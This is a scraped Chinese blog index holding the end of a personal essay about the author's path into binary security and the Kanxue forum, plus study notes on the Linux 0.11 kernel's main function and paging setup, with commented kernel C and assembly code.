学习期间也有迷茫，尤其是我这种直接进入二进制世界的人。当时周围的人都是web出发，只有我自己是直接进入的二进制，就很孤独。所以我的第一、第二个帖子都是关于这种方向类的选择犹豫。其中有个回答很好地解决了我这个问题： 我很感谢这位“雪人”的答复（如果本人觉得放这里不合适，请联系我删除）。正是他的这几句话，帮助我坚定了自己的决心。从他的介绍出发，我自己google了两个大方向的细节内容，觉得自己的性子可能还是适合二进制，而且也享受那种偏底层一点的分析的过程和感觉。 再后来，就是稳扎稳打地慢慢学，跟着看雪知识库，跟着论坛上大牛的帖子，跟着《加解密》和《0day》，中间顺道去打打CTF，扩展一下知识面（我发现我个人真的不适合CTF，玩不来，虽然很喜欢-。-），重心还是在论文上（我导师的论文要求太高了，没办法）。 论文完成之后，我就去了实习。当时觉得自己水平不够，除了论文中开发的一个框架，其他什么成果也没有，CTF也没有成绩，所以没想到能成功。很感谢当时面试我的那位架构师大佬，虽然他本意是想招一个安全开发，但最后还是收下了我，只是没有进他的组，而是去了漏洞组。然后我就开始了我觉得成长最快的一段时间，终于在2019年的4月5日，我发了我在看雪的第一篇技术文章——《Windows SMB协议简单分析》，BDomne版主还给了优秀贴。虽然这文章现在看来很水，但是当时真的十分开心。我觉得我一直在从看雪、从其他人手里“拿”东西，现在也能给出一些回报了。抱着这种心情，在2019年，也产出了一些其他文章，但是现在看来当时的自己水平真的一般，大部分是一些比较简陋的漏洞分析和简单的CTF题解。我意识到自己和论坛里精华帖大牛们的差距，同时发现自己有点浮躁了，决定自我沉淀一下。期间参加了2019年的SDC，属于是第一次参加的安全方向线下会议。我当时的想法有两个，一个是觉得自己加入看雪是对的，一个是想的总有一天我也要上去分享一次。 在2020年，我告诉自己，如果是技术帖，一定要发精华帖，宁缺毋滥。我希望发出来的文章是真的有内容在里面，有能得到大佬们认可的技术能力在里面，感觉这样才是跟看雪初衷、跟当时进入看雪的我的初衷相一致的。2020年分析了很多的漏洞，把自己的一些分析成果沉淀到了论坛里。在这一年，做到了每个帖子都是精华帖（有一些现在看来是有欠缺的，当时文档能力不稳定，很多想表达的东西没有表达清楚）。年终的时候，被评为了看雪2020年的年度新人。这期间，继续参加了看雪2020的SDC。我实力仍然不够，当不了演讲嘉宾。但是，我个人觉得，2020年才是我真正为看雪做出点东西的一年。 2021年的1月19号，我申请了看雪论坛二进制漏洞板块的版主。但是跟段哥聊了很久，我的本意是除了文章之外，我想为看雪做一点其他的贡献，但是对自己的能力缺乏信心。段哥当时给了我很大的鼓舞，让我很触动。成为版主后，将自己之前总结的一份相对比较全面的二进制漏洞分析文档的模板共享了出来。虽然我们不强调固定的套版思路，但是在文档编写上，我个人感觉还是规范化更好一点。然后总结了一份二进制漏洞分析的脑图，参考大家的意见进行了几次优化，当作给和当初的我一样的新人们的一份参考。我日常会审核一些板块的帖子。起初，是有一些吃力的，因为审核一篇帖子需要花费的时间还是很久的，对于一些技术点可能你之前根本没有涉及过，需要查资料或者请教朋友去共同审核。发出来的文章都是大家辛苦编写的，我觉得还是需要十分慎重对待的，要对得起作者的辛苦付出。文章审核的工作，让我见到了更多的技术大佬，也让我学习到了很多。2021年的SDC，也有参加，但是因为时间问题，没能参加最后的看雪闭门聚餐，是十分遗憾的，感谢段哥的邀请吧，希望明年的SDC我可以带着议题去。2021年文章产出数量下降了，主要是换了新方向，还在摸索阶段，有些东西太敏感不能发，有些东西技术含量不够不值得发，所以导致文章数量下降，但是质量我还是可以保证的，希望2022年可以再来一次爆发吧。 ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:2:0","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"冥冥之中的缘分 总觉得和看雪有一种冥冥之中的缘分，因为研究生阶段的研究方向是内存取证，基本是纯二进制的内容，所以我没有接触过多的web安全，这刚好跟看雪论坛的主要内容一致，所以就很对味。再然后开始买《加解密》、《0day》来看，发现这两本书还是跟看雪有很大的渊源。我当时真的欣喜若狂。因为看雪是我全自主发现的，自己探索到的，恰好就是我的研究方向相关的，也是我个人感兴趣的。我觉得这对我来说是一种很大的缘分，也是一种很大的幸运。试想一下当时如果没有看雪论坛，没有知识库，没有每年的看雪精华合集，没有论坛里每位技术大佬的无私分享，作为新一辈的二进制安全学习人员可能并不能很好地建立全面的二进制安全体系，并不能结识到圈里这些安全前辈，如果真的这样，我真心觉得是一种遗憾。 ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:3:0","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"一直走下去 现在，知识付费的风潮正劲。不知道是环境问题，还是发展到今天就必定要经历这个阶段，大家开始浮躁了，开始急功近利，开始什么事情都开始跟利益挂钩。新声代不乏技术牛人，但是还秉持着初心的，我感觉太少了。这是我们跟安全老前辈们的差距。看着好多人有一点成绩后开始各种渠道去割韭菜、圈钱，我就想到在刚进入看雪的时候，看雪给我的那种纯净的感觉。至今为止，看雪论坛本身没有靠文章去赚钱，没有付费注册会员、没有付费查看文章，每年的服务器架设、网站运营其实花销也很大。看雪论坛的“雪人”们也继续在无私奉献着自己的学习成果、研究成果，我衷心觉得看雪是纯净的、“雪人”们是可爱的。 话有点多了，简单总结下吧。人世纷乱，出入平安。希望有毒能跟着看雪继续走下去，希望喜欢看雪的大家，能跟着看雪继续走下去。往往悠然心不乱，琅琅天乐自来迎。 ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:4:0","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第八篇","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professional本文是Linux 0.11系列学习记录的正式的第八篇。 从本篇开始，正式进入第二部分，从 main 函数开始。 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"11. main.c 的初步理解 在经过前面 10 回的操作后，进去 main 函数之前的工作都已完成，接下来就是操作系统的全部代码骨架的地方 —— main 函数。 void main(void) /* 这里确实是void，并没错。 */ { /* 在startup 程序(head.s)中就是这样假设的。 */ /* * 此时中断仍被禁止着，做完必要的设置后就将其开启。 */ // 下面这段代码用于保存： // 根设备号 -\u003e ROOT_DEV； 高速缓存末端地址 -\u003e buffer_memory_end； // 机器内存数 -\u003e memory_end；主内存开始地址 -\u003e main_memory_start； ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// 内存大小=1Mb 字节+扩展内存(k)*1024 字节。 memory_end \u0026= 0xfffff000; // 忽略不到4Kb（1 页）的内存数。 if (memory_end \u003e 16*1024*1024) // 如果内存超过16Mb，则按16Mb 计。 memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // 如果内存\u003e12Mb，则设置缓冲区末端=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // 否则如果内存\u003e6Mb，则设置缓冲区末端=2Mb buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// 否则则设置缓冲区末端=1Mb main_memory_start = buffer_memory_end;// 主内存起始位置=缓冲区末端； #ifdef RAMDISK // 如果定义了虚拟盘，则主内存将减少。 main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif // 以下是内核进行所有方面的初始化工作。阅读时最好跟着调用的程序深入进去看，实在看 // 不下去了，就先放一放，看下一个初始化调用-- 这是经验之谈:) mem_init(main_memory_start,memory_end); trap_init(); // 陷阱门（硬件中断向量）初始化。（kernel/traps.c） blk_dev_init(); // 块设备初始化。（kernel/blk_dev/ll_rw_blk.c） chr_dev_init(); // 字符设备初始化。（kernel/chr_dev/tty_io.c）空，为以后扩展做准备。 tty_init(); // tty 初始化。（kernel/chr_dev/tty_io.c） time_init(); // 设置开机启动时间 -\u003e startup_time。 sched_init(); // 调度程序初始化(加载了任务0 的tr, ldtr) （kernel/sched.c） buffer_init(buffer_memory_end);// 缓冲管理初始化，建内存链表等。（fs/buffer.c） hd_init(); // 硬盘初始化。（kernel/blk_dev/hd.c） floppy_init(); // 软驱初始化。（kernel/blk_dev/floppy.c） sti(); // 所有初始化工作都做完了，开启中断。 // 下面过程通过在堆栈中设置的参数，利用中断返回指令切换到任务0。 move_to_user_mode(); // 移到用户模式。（include/asm/system.h） if (!fork()) { /* we count on this going ok */ init(); } /* * 注意!! 对于任何其它的任务，'pause()'将意味着我们必须等待收到一个信号才会返 * 回就绪运行态，但任务0（task0）是唯一的意外情况（参见'schedule()'），因为任 * 务0 在任何空闲时间里都会被激活（当没有其它任务在运行时）， * 因此对于任务0'pause()'仅意味着我们返回来查看是否有其它任务可以运行，如果没 * 有的话我们就回到这里，一直循环执行'pause()'。 */ for(;;) pause(); } // end main 其中的代码部分也就 20 几行，接下来我们拆分来看整个的 main 函数。 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"1. 第一部分，参数的取值和计算 // 下面这段代码用于保存： // 根设备号 -\u003e ROOT_DEV； 高速缓存末端地址 -\u003e buffer_memory_end； // 机器内存数 -\u003e memory_end；主内存开始地址 -\u003e main_memory_start； ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; // 之前在汇编语言中获取的各个设备的参数信息 memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// 内存大小=1Mb 字节+扩展内存(k)*1024 字节。 memory_end \u0026= 0xfffff000; // 忽略不到4Kb（1 页）的内存数。 if (memory_end \u003e 16*1024*1024) // 如果内存超过16Mb，则按16Mb 计。 memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // 如果内存\u003e12Mb，则设置缓冲区末端=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // 否则如果内存\u003e6Mb，则设置缓冲区末端=2Mb buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// 否则则设置缓冲区末端=1Mb main_memory_start = buffer_memory_end;// 主内存起始位置=缓冲区末端； #ifdef RAMDISK // 如果定义了虚拟盘，则主内存将减少。 main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif 设备参数信息来自 setup.s 汇编程序调用 BIOS 中断获取的各个设备的信息，并保存在约定好的内存地址 0x90000 处，如下表所示： 上面的内存变量则指明了主内存的开始地址、系统所拥有的内存容量和作为高速缓冲区内存的末端地址。而且如果还定义了虚拟盘（RAM DISK），主内存还会适当减少。 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:1","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"2. 第二部分，各种初始化 init 操作 内核进行所有方面的硬件初始化工作，包括陷阱门、块设备、字符设备和 tty，还包括人工设置第一个任务（task 0）。所有的初始化工作完成后，程序就设置中断允许标志以开启中断，并切换到任务 0 中进行。在阅读这些初始化子程序时，最好跟着被调用的程序深入进去看，实在看不下去了，就先放放，然后看下一个，在有些理解之后再继续研究没有看懂的地方。 mem_init(main_memory_start,memory_end); trap_init(); // 陷阱门（硬件中断向量）初始化。（kernel/traps.c） blk_dev_init(); // 块设备初始化。（kernel/blk_dev/ll_rw_blk.c） chr_dev_init(); // 字符设备初始化。（kernel/chr_dev/tty_io.c）空，为以后扩展做准备。 tty_init(); // tty 初始化。（kernel/chr_dev/tty_io.c） time_init(); // 设置开机启动时间 -\u003e startup_time。 sched_init(); // 调度程序初始化(加载了任务0 的tr, ldtr) （kernel/sched.c） buffer_init(buffer_memory_end);// 缓冲管理初始化，建内存链表等。（fs/buffer.c） hd_init(); // 硬盘初始化。（kernel/blk_dev/hd.c） floppy_init(); // 软驱初始化。（kernel/blk_dev/floppy.c） sti(); // 所有初始化工作都做完了，开启中断。 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:2","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"3. 第三部分，切换到用户态 在完成各种初始化后，切换到用户态模式，并在新的进程中做最终的初始化 —— init。 // 下面过程通过在堆栈中设置的参数，利用中断返回指令切换到任务0。 move_to_user_mode(); // 移到用户模式。（include/asm/system.h） if (!fork()) { /* we count on this going ok */ init(); } init() 函数会创建一个进程，设置终端的标准 IO，然后再创建出一个执行 shell 程序的进程来接收用户的命令，此时就会出现如下画面： 在整个内核完成初始化后，内核将执行权切换到了用户模式，也即 CPU 从 0 特权级切换到了第 3 特权级。此时 main.c 的主程序就工作在任务 0 中，然后系统第一次调用进程创建函数 fork()，创建出一个用于运行 init() 的子进程。系统的整个初始化过程如下图所示： ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:3","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"4. 第四部分，设置无限循环 /* * 注意!! 对于任何其它的任务，'pause()'将意味着我们必须等待收到一个信号才会返 * 回就绪运行态，但任务0（task0）是唯一的意外情况（参见'schedule()'），因为任 * 务0 在任何空闲时间里都会被激活（当没有其它任务在运行时）， * 因此对于任务0'pause()'仅意味着我们返回来查看是否有其它任务可以运行，如果没 * 有的话我们就回到这里，一直循环执行'pause()'。 */ for(;;) pause(); ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:4","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"5. 阶段总结 到此为止，我们对 main.c 的整体就有了全面的认识，对于其中的细节我们会在接下来的过程中详细分析。 截止到目前为止的内存布局如下： 在接下来的操作中，操作系统会在上面的内存布局中建立各种数据结构及其调用。 我们目前已完成的工作如下： 前面所有工作的重心就是三张表的设置：全局描述符表、中断描述符表、页表。同时还设置了各种段寄存器，栈顶指针。并且，还为后续的程序提供了设备信息，保存在 0x90000 处往后的几个位置上。 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:5","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"6. 参考链接 第十一回 整个操作系统就 20 几行代码 《Linux 内核完全剖析》第7章 ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:6","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第七篇","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professional本文是Linux 0.11系列学习记录的正式的第七篇。 从本篇开始，在每篇文章中会加入自己的理解和补充，各位可按需查看。 ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"10 进入 main.c 在前面我们已经设置了idt、gdt、页表等，并且开启了保护模式，接下来就准备进入 main.c 。 我们前面有提到，在下面的代码处准备跳转到 main.c： after_page_tables: push 0 push 0 push 0 push L6 push _main jmp setup_paging ... setup_paging: ... ret 在经过连续的 5 个 push 操作之后，内存栈变成如下形式： 然后，setup_paging 最后一个指令是 ret，也就是我们上一回讲的设置分页的代码的最后一个指令，形象地说它叫返回指令，但 CPU 可没有那么聪明，它并不知道该返回到哪里执行，只是很机械地把栈顶的元素值当做返回地址，跳转去那里执行。 再具体说是，把 esp 寄存器（栈顶地址）所指向的内存处的值，赋值给 eip 寄存器，而 cs:eip 就是 CPU 要执行的下一条指令的地址。而此时栈顶刚好是 main.c 里写的 main 函数的内存地址，是我们刚刚特意压入栈的，所以 CPU 就理所应当跳过来了。 当然 Intel CPU 是设计了 call 和 ret 这一配对儿的指令，意为调用函数和返回，具体可以看后面本回扩展资料里的内容。 至于其他压入栈的 L6 是用作当 main 函数返回时的跳转地址，但由于在操作系统层面的设计上，main 是绝对不会返回的，所以也就没用了。而其他的三个压栈的 0，本意是作为 main 函数的参数，但实际上似乎也没有用到，所以也不必关心。 总之，经过这一个小小的骚操作，程序终于跳转到 main.c 这个由 c 语言写就的主函数 main 里了。 void main(void) /* 这里确实是void，并没错。 */ { /* 在startup 程序(head.s)中就是这样假设的。 */ /* * 此时中断仍被禁止着，做完必要的设置后就将其开启。 */ // 下面这段代码用于保存： // 根设备号 -\u003e ROOT_DEV； 高速缓存末端地址 -\u003e buffer_memory_end； // 机器内存数 -\u003e memory_end；主内存开始地址 -\u003e main_memory_start； ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// 内存大小=1Mb 字节+扩展内存(k)*1024 字节。 memory_end \u0026= 0xfffff000; // 忽略不到4Kb（1 页）的内存数。 if (memory_end \u003e 16*1024*1024) // 如果内存超过16Mb，则按16Mb 计。 memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // 如果内存\u003e12Mb，则设置缓冲区末端=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // 否则如果内存\u003e6Mb，则设置缓冲区末端=2Mb buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// 否则则设置缓冲区末端=1Mb main_memory_start = buffer_memory_end;// 主内存起始位置=缓冲区末端； #ifdef RAMDISK // 如果定义了虚拟盘，则主内存将减少。 main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif // 以下是内核进行所有方面的初始化工作。阅读时最好跟着调用的程序深入进去看，实在看 // 不下去了，就先放一放，看下一个初始化调用-- 这是经验之谈:) mem_init(main_memory_start,memory_end); trap_init(); // 陷阱门（硬件中断向量）初始化。（kernel/traps.c） blk_dev_init(); // 块设备初始化。（kernel/blk_dev/ll_rw_blk.c） chr_dev_init(); // 字符设备初始化。（kernel/chr_dev/tty_io.c）空，为以后扩展做准备。 tty_init(); // tty 初始化。（kernel/chr_dev/tty_io.c） time_init(); // 设置开机启动时间 -\u003e startup_time。 sched_init(); // 调度程序初始化(加载了任务0 的tr, ldtr) （kernel/sched.c） buffer_init(buffer_memory_end);// 缓冲管理初始化，建内存链表等。（fs/buffer.c） hd_init(); // 硬盘初始化。（kernel/blk_dev/hd.c） floppy_init(); // 软驱初始化。（kernel/blk_dev/floppy.c） sti(); // 所有初始化工作都做完了，开启中断。 // 下面过程通过在堆栈中设置的参数，利用中断返回指令切换到任务0。 move_to_user_mode(); // 移到用户模式。（include/asm/system.h） if (!fork()) { /* we count on this going ok */ init(); } /* * 注意!! 对于任何其它的任务，'pause()'将意味着我们必须等待收到一个信号才会返 * 回就绪运行态，但任务0（task0）是唯一的意外情况（参见'schedule()'），因为任 * 务0 在任何空闲时间里都会被激活（当没有其它任务在运行时）， * 因此对于任务0'pause()'仅意味着我们返回来查看是否有其它任务可以运行，如果没 * 有的话我们就回到这里，一直循环执行'pause()'。 */ for(;;) pause(); } // end main 整个OS会最终停留在最后一行的死循环中，永不返回，直到关机。 至此，进入 main 函数的准备工作已经全部完成了，前面我们做的所有工作如下： 此时的内存布局如下： 然后进入到 main 函数中继续执行。 ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"第一部分总结 截止到这一篇位置，第一部分已经全部完成，在进入 main.c 之前的所有工作都已经完成，接下来的运行就开始运行 main 函数了。 由于这一部分大部分都是在和 Intel CPU 打交道，所以参考资料大部分是 Intel 手册： ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第六篇","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professional本文是Linux 0.11系列学习记录的正式的第六篇。 从本篇开始，在每篇文章中会加入自己的理解和补充，各位可按需查看。 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"09 Intel 的内存管理：分段与分页 上文说到 head.s 代码在重新设置了 gdt 和 idt 之后，此时的内存分布如下： 然后待执行的代码如下： jmp after_page_tables ... after_page_tables: push 0 push 0 push 0 push L6 ; 模拟调用 mainc.c 程序时首先将返回地址入栈的操作，main.c退出时，会返回到 L6，从而进入死循环 push _main ; main.c 地址入栈，这样在设置分页处理结束后，执行 ret 时会将 main.c 地址 pop 出来，从而去执行 main.c jmp setup_paging L6: jmp L6 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"1. 分页机制 在前面有介绍，在保护模式下，要先经过分段机制的转换才能变成物理地址： 在没有开启分页的时候，分段机制回顾： 分段机制涉及的4个关键内容：逻辑地址、段描述符（描述段的属性）、段描述符表（包含多个段描述符的“数组”）、段选择子（段寄存器，用于定位段描述符表中表项的索引）。 转换逻辑地址到物理地址分过程如下：CPU把逻辑地址（由段选择子selector和段偏移offset组成）中的段选择子的内容作为段描述符表的索引，找到表中对应的段描述符，然后把段描述符中保存的段基址加上段偏移值，形成线性地址。 但是开启分页之后，会多一步转换： 可以看到，在开启分页后，逻辑地址经过分段机制的转换后，不会直接获得物理地址，而是一个线性地址，然后需要再通过一次分页机制转换才能得到最终的物理地址，此时其过程如下： 而对于从线性地址到分页物理地址的转换过程如下（使用32-bit分页机制）： 以4K页为例，线性地址的前10位表示页表目录，中间10位表示页表项，最后12位表示页内偏移。 首先根据高10位在页目录表中找到一个页目录项，这个页目录项的值加上中间10位拼接后的地址去页表中寻找一个页表项，这个页表项的值再加上后12位的偏移地址，就是最终的物理地址。 接下来以一个例子来感受分页机制： 假设经过分段机制转换后的线性地址是15M，二进制表示为 0000000011_0100000000_000000000000，其转换过程如下： 上述管转换过程的操作由MMU也就是内存管理单元完成，其主要作用就是将虚拟地址转换为物理地址。所以整个过程OS作为软件层，只需要提供好页目录表和页表即可，这种页表方案叫做二级页表，第一级叫做页目录表PDE，第二级叫做页表PTE，其结构如下： 之后再开启分页机制的开关，其实就是更改 cr0 寄存器中的第31位即可。在开始保护模式时，也是更改该寄存器中的第0位的值： 然后，MMU 就可以帮我们进行分页的转换了。此后指令中的内存地址（就是程序员提供的逻辑地址），就统统要先经过分段机制的转换，再通过分页机制的转换，才能最终变成物理地址。 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:1","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"2. 开启分页机制 下面看分页机制如何开启，也就是 setup_paging 部分，主要是帮我们把页表和页目录表在内存中写好，然后开启 cr0 寄存器的分页开关： ;/* ; * Setup_paging ; * ; * 这个子程序通过设置控制寄存器cr0 的标志（PG 位31）来启动对内存的分页处理 ; * 功能，并设置各个页表项的内容，以恒等映射前16 MB 的物理内存。分页器假定 ; * 不会产生非法的地址映射（也即在只有4Mb 的机器上设置出大于4Mb 的内存地址）。 ; * ; * 注意！尽管所有的物理地址都应该由这个子程序进行恒等映射，但只有内核页面管 ; * 理函数能直接使用\u003e1Mb 的地址。所有“一般”函数仅使用低于1Mb 的地址空间，或 ; * 者是使用局部数据空间，地址空间将被映射到其它一些地方去-- mm(内存管理程序) ; * 会管理这些事的。 ; */ align 2 ;// 按4 字节方式对齐内存地址边界。 setup_paging: ;// 首先对5 页内存（1 页目录+ 4 页页表）清零 mov ecx,1024*5 ;/* 5 pages - pg_dir+4 page tables */ xor eax,eax xor edi,edi ;/* pg_dir is at 0x000 */ ;// 页目录从0x000 地址开始。 pushf ;// VC内汇编使用cld和std后，需要自己恢复DF的值 cld rep stosd ;// 下面4 句设置页目录中的项，我们共有4 个页表所以只需设置4 项。 ;// 页目录项的结构与页表中项的结构一样，4 个字节为1 项。参见上面的说明。 ;// \"$pg0+7\"表示：0x00001007，是页目录表中的第1 项。 ;// 则第1 个页表所在的地址= 0x00001007 \u0026 0xfffff000 = 0x1000；第1 个页表 ;// 的属性标志= 0x00001007 \u0026 0x00000fff = 0x07，表示该页存在、用户可读写。 mov eax,_pg_dir mov [eax],pg0+7 ;/* set present bit/user r/w */ mov [eax+4],pg1+7 ;/* --------- \" \" --------- */ mov [eax+8],pg2+7 ;/* --------- \" \" --------- */ mov [eax+12],pg3+7 ;/* --------- \" \" --------- */ ;// 下面6 行填写4 个页表中所有项的内容，共有：4(页表)*1024(项/页表)=4096 项(0 - 0xfff)， ;// 也即能映射物理内存4096*4Kb = 16Mb。 ;// 每项的内容是：当前项所映射的物理内存地址+ 该页的标志（这里均为7）。 ;// 使用的方法是从最后一个页表的最后一项开始按倒退顺序填写。一个页表的最后一项 ;// 在页表中的位置是1023*4 = 4092。因此最后一页的最后一项的位置就是$pg3+4092。 mov edi,pg3+4092 ;// edi -\u003e 最后一页的最后一项。 mov eax,00fff007h ;/* 16Mb - 4096 + 7 (r/w user,p) */ ;// 最后1 项对应物理内存页面的地址是0xfff000， ;// 加上属性标志7，即为0xfff007. std ;// 方向位置位，edi 值递减(4 字节)。 L3: stosd ;/* fill pages backwards - more efficient :-) */ sub eax,00001000h ;// 每填写好一项，物理地址值减0x1000。 jge L3 ;// 如果小于0 则说明全添写好了。 popf ;// 设置页目录基址寄存器cr3 的值，指向页目录表。 xor eax,eax ;/* 页目录表(pg_dir)在0x0000 处。 */ mov cr3,eax ;/* cr3 - page directory start */ ;// 设置启动使用分页处理（cr0 的PG 标志，位31） mov eax,cr0 or eax,80000000h ;// 添上PG 标志。 mov cr0,eax ;/* set paging (PG) bit */ ret ;/* this also flushes prefetch-queue */ ;// 在改变分页处理标志后要求使用转移指令刷新预取指令队列，这里用的是返回指令ret。 ;// 该返回指令的另一个作用是将堆栈中的main 程序的地址弹出，并开始运行/init/main.c ;// 程序。本程序到此真正结束了。 当时 linux-0.11 认为，总共可以使用的内存不会超过 16M，也即最大地址空间为 0xFFFFFF。而按照当前的页目录表和页表这种机制，1 个页目录表最多包含 1024 个页目录项（也就是 1024 个页表），1 个页表最多包含 1024 个页表项（也就是 1024 个页），1 页为 4KB（因为有 12 位偏移地址），因此，16M 的地址空间可以用 1 个页目录表 + 4 个页表搞定。 4（页表数）* 1024（页表项数） * 4KB（一页大小）= 16MB 所以，上面这段代码就是，将页目录表放在内存地址的最开头。 _pg_dir: _startup_32: mov eax,0x10 mov ds,ax .. 之后紧挨着这个页目录表，放置 4 个页表，代码里也有这四个页表的标签项。 .org 0x1000 pg0: .org 0x2000 pg1: .org 0x3000 pg2: .org 0x4000 pg3: .org 0x5000 最终将页目录表和页表填写好数值，来覆盖整个 16MB 的内存。随后，开启分页机制。此时内存中的页表相关的布局如下。 这些页目录表和页表放到了整个内存布局中最开头的位置，就是覆盖了开头的 system 代码了，不过被覆盖的 system 代码已经执行过了，所以无所谓。同时，如 idt 和 gdt 一样，我们也需要通过一个寄存器告诉 CPU 我们把这些页表放在了哪里，就是这段代码。 xor eax,eax mov cr3,eax 我们相当于告诉 cr3 寄存器，0 地址处就是页目录表，再通过页目录表可以找到所有的页表，也就相当于 CPU 知道了分页机制的全貌了。 至此后，整个内存布局如下。 那么具体页表设置好后，映射的内存是怎样的情况呢？那就要看页表的具体数据了，就是这一坨代码。 setup_paging: ... mov eax,_pg_dir mov [eax],pg0+7 mov [eax+4],pg1+7 mov [eax+8],pg2+7 mov [eax+12],pg3+7 mov edi,pg3+4092 mov eax,00fff007h std L3: stosd sub eax, 1000h jpe L3 ... 很简单，对照刚刚的页目录表与页表结构看。 前五行表示，页目录表的前 4 个页目录项，分别指向 4 个页表。比如页目录项中的第一项 [eax] 被赋值为 pg0+7，也就是 0x00001007，根据页目录项的格式，表示页表地址为 0x1000，页属性为 0x07 表示改页存在、用户可读写。后面几行表示，填充 4 个页表的每一项，一共 4*1024=4096 项，依次映射到内存的前 16MB 空间。 画出图就是这个样子，其实刚刚的图就是。 最终的效果就是，经过这套分页机制，线性地址将恰好和最终转换的物理地址一样。 现在只有四个页目录项，也就是将前 16M 的线性地址空间，与 16M 的物理地址空间一一对应起来了。 对于上述内容可以整理总结如下： Intel 体系结构的内存管理可以分成两大部分，也就是标题中的两板斧，分段和分页。 